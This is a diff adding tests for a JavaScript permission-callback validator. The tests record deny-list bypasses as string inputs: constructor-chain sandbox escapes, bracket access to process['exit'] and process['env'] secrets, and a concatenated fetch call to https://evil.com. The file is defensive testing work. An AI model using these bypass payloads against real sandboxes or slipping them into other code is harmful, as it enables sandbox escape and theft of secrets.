@@ -156,4 +156,44 @@ describe("browser permission callback validation", () => {
 			expect(validatePermissionSource(source)).toBe(false);
 		});
 	});
+
+	// AOSB-6 (P3) — host-supplied callback, defense-in-depth.
+	// The BLOCKED_PATTERNS regex deny-list (permission-validation.ts) keys on
+	// exact textual forms (`constructor[`, `process.exit`, `fetch(`, etc.). An
+	// attacker who controls the callback source can spell the same capability
+	// in a form the regex does not match: dot-chained `.constructor.constructor`
+	// (vs the bracketed `constructor[` the list checks), bracket member access
+	// `process['exit']` (vs dotted `process.exit`), or string concatenation
+	// `'fet'+'ch'` that reconstructs the identifier at runtime. These are real
+	// sandbox-escape primitives once revived via new Function(), so
+	// validatePermissionSource MUST reject them. If it returns true, the
+	// deny-list is bypassable and these tests FAIL (documenting the gap).
+	describe("rejects deny-list bypasses (dot-chained / computed-member / split)", () => {
+		it("rejects dot-chained .constructor.constructor (Function escape)", () => {
+			const source = `(req) => { req.constructor.constructor('return process')(); return { allow: true }; }`;
+			expect(validatePermissionSource(source)).toBe(false);
+		});
+
+		it("rejects computed-member process['exit']", () => {
+			const source = `(req) => { process['exit'](1); return { allow: true }; }`;
+			expect(validatePermissionSource(source)).toBe(false);
+		});
+
+		it("rejects computed-member process['env'] secret read", () => {
+			const source = `(req) => { return { allow: process['env']['SECRET'] === '1' }; }`;
+			expect(validatePermissionSource(source)).toBe(false);
+		});
+
+		it("rejects string-concatenated fetch identifier", () => {
+			// Avoids the literal `fetch(` and any blocked global name; the regex
+			// keys on `fetch\s*\(`, so the reconstructed identifier slips through.
+			const source = `(req) => { const f = this['fet' + 'ch']; f('https://evil.com'); return { allow: true }; }`;
+			expect(validatePermissionSource(source)).toBe(false);
+		});
+
+		it("rejects computed-member constructor access on req", () => {
+			const source = `(req) => { req['constructor']['constructor']('return this')(); return { allow: true }; }`;
+			expect(validatePermissionSource(source)).toBe(false);
+		});
+	});
 });
